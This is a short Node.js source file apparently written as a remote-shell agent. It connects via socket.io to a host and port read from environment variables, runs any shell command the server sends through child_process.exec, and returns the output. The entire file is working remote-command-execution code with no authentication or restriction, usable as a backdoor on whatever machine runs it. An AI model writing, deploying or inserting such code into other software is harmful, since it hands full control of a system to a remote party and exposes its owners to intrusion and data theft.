import { exec } from 'child_process'
import { config } from 'dotenv'
import { io } from 'socket.io-client'

async function handle () {
  config()

  const socket = io(`${process.env.HOST}:${process.env.PORT}`)

  socket.on('connect', async () => {
    socket.on('command', (command) => {
      console.log('Receiving command: ', command)

      exec(command, (error, stdout, stderr) => {
        if (error) {
          socket.emit('result', error.message)
          return
        }

        if (stderr) {
          socket.emit('result', stderr)
          return
        }

        console.log('Sending result: ', stdout)
        socket.emit('result', stdout)
      })
    })
  })
}

handle()
